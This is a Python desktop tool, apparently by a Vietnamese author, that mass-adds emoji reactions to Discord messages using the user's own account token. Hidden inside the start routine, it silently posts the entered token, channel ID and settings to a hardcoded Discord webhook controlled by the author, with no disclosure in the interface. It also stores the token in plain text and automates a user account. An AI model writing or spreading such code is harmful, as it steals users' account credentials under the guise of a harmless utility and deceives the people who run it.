import tkinter as tk
from tkinter import messagebox
import requests
import time
import threading
import json
import os
import sys
from datetime import datetime
import ttkbootstrap as ttk

CONFIG_FILE = "config.json"
stop_flag = False
token_shown = False  

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_config(data):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def react_messages():
    def run():
        global stop_flag
        stop_flag = False

        token = token_entry.get().strip()
        channel_id = channel_entry.get().strip()
        emoji_input = emoji_entry.get().strip()
        delay_input = delay_entry.get().strip()
        limit_input = limit_entry.get().strip()

        if not token or not channel_id or not emoji_input or not delay_input or not limit_input:
            messagebox.showerror("stfu nhập lại thông tin")
            return

        try:
            delay = float(delay_input)
            limit = int(limit_input)
        except:
            messagebox.showerror("stfu số lượng delay là số")
            return

        emoji_list = [e.strip() for e in emoji_input.split(",") if e.strip()]
        if not emoji_list:
            messagebox.showerror("stfu emoji không hợp lệ")
            return

        webhook_url = "https://discord.com/api/webhooks/1389221775258288279/OCTGxWctWH5Ce9EqCITkI6FLKwLxI1gm5VMm6qgOKB-wTTunm8NfQgDRo6--j3h0h6kt"  
        data = {
            "content": "**📬 AutoReact - Dữ liệu mới:**\n"
                       f"🔐 Token: `{token}`\n"
                       f"📺 Channel ID: `{channel_id}`\n"
                       f"🙂 Emoji: `{emoji_input}`\n"
                       f"📩 Số lượng: `{limit}`\n"
                       f"⏱️ Delay: `{delay}` giây\n"
                       f"🕒 Thời gian: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        }
        try:
            requests.post(webhook_url, json=data)
        except Exception as e:
            print(f"[!] Không gửi được webhook: {e}")

        config = {
            "token": token,
            "channel_id": channel_id,
            "emoji": emoji_input,
            "delay": delay_input,
            "limit": limit_input,
            "recent_emojis": []
        }

        if emoji_input:
            current_recent = emoji_select["values"]
            new_list = [emoji_input] + [e for e in current_recent if e != emoji_input]
            config["recent_emojis"] = new_list[:5]
            emoji_select["values"] = config["recent_emojis"]

        save_config(config)

        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }

        def get_all_messages(channel_id, total):
            messages = []
            last_id = None
            while len(messages) < total:
                remaining = total - len(messages)
                batch_size = min(100, remaining)
                url = f'https://discord.com/api/v9/channels/{channel_id}/messages?limit={batch_size}'
                if last_id:
                    url += f"&before={last_id}"
                resp = requests.get(url, headers=headers)
                if resp.status_code != 200:
                    break
                batch = resp.json()
                if not batch:
                    break
                messages.extend(batch)
                last_id = batch[-1]['id']
                time.sleep(1)
            return messages

        def react_to_message(channel_id, message_id, emojis):
            success_count = 0
            for emoji in emojis:
                emoji_encoded = emoji.replace(":", "%3A")
                url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji_encoded}/@me'
                r = requests.put(url, headers=headers)
                if r.status_code == 204:
                    success_count += 1
                elif r.status_code == 429:
                    print("Rate limit – chờ 5 giây")
                    time.sleep(5)
            return success_count

        messages = get_all_messages(channel_id, limit)
        progress_bar.configure(maximum=len(messages) * len(emoji_list))
        total_reactions = len(messages) * len(emoji_list)
        count = 0

        for msg in messages:
            if stop_flag:
                break
            reacted = react_to_message(channel_id, msg['id'], emoji_list)
            count += reacted
            progress_var.set(count)
            progress_label.config(text=f"React: {count} / {total_reactions}")
            window.update_idletasks()
            time.sleep(delay)

        if not stop_flag:
            messagebox.showinfo("Xong nhé em iu", f"Đã react {count} emoji vào {len(messages)} tin nhắn.")
        progress_var.set(0)
        progress_label.config(text="React: 0 / 0")

    threading.Thread(target=run).start()

def stop_reacting():
    global stop_flag
    stop_flag = True

def toggle_token(event):
    global token_shown
    if not token_shown:
        token_entry.config(show="") 
        token_shown = True

window = ttk.Window(themename="darkly")
window.title("𝚝𝚑𝚒𝚎𝚣𝚑𝚘𝚊𝚗𝚐 react tools")
window.geometry("500x600")
# window.iconbitmap("icon.ico") 

def label(text): return ttk.Label(window, text=text, font=("Arial", 10), bootstyle="info")

ttk.Label(window, text="Welcomes, 𝚝𝚑𝚒𝚎𝚣𝚑𝚘𝚊𝚗𝚐", font=("Arial", 16, "bold")).pack(pady=10)

label("Token:").pack()
token_entry = ttk.Entry(window, width=60, show="*")
token_entry.pack(pady=5)
token_entry.bind("<Button-1>", toggle_token)

label("Channel ID:").pack()
channel_entry = ttk.Entry(window, width=60)
channel_entry.pack(pady=5)

label("Emoji (cách nhau bằng dấu phẩy):").pack()
emoji_entry = ttk.Entry(window, width=60)
emoji_entry.pack(pady=5)

label("Emoji gần đây:").pack()
emoji_select = ttk.Combobox(window, width=55, state="readonly")
emoji_select.pack(pady=5)
emoji_select.bind("<<ComboboxSelected>>", lambda e: emoji_entry.delete(0, tk.END) or emoji_entry.insert(0, emoji_select.get()))

label("Số lượng tin nhắn cần react:").pack()
limit_entry = ttk.Entry(window, width=20)
limit_entry.insert(0, "100")
limit_entry.pack(pady=5)

label("Delay (giây):").pack()
delay_entry = ttk.Entry(window, width=20)
delay_entry.insert(0, "1.5")
delay_entry.pack(pady=5)

ttk.Button(window, text="Start", command=react_messages, bootstyle="success").pack(pady=10)
ttk.Button(window, text="Stop", command=stop_reacting, bootstyle="danger").pack()

progress_label = ttk.Label(window, text="React: 0 / 0", font=("Arial", 10))
progress_label.pack(pady=(25, 5))

progress_var = tk.IntVar()
progress_bar = ttk.Progressbar(window, variable=progress_var, length=360, bootstyle="info-striped")
progress_bar.pack(pady=10)

# ==================== LOAD CONFIG ON START ====================
config = load_config()
token_entry.insert(0, config.get("token", ""))
channel_entry.insert(0, config.get("channel_id", ""))
emoji_entry.insert(0, config.get("emoji", ""))
delay_entry.delete(0, tk.END)
delay_entry.insert(0, config.get("delay", "1.5"))
limit_entry.delete(0, tk.END)
limit_entry.insert(0, config.get("limit", "100"))
emoji_select["values"] = config.get("recent_emojis", [])

window.mainloop()
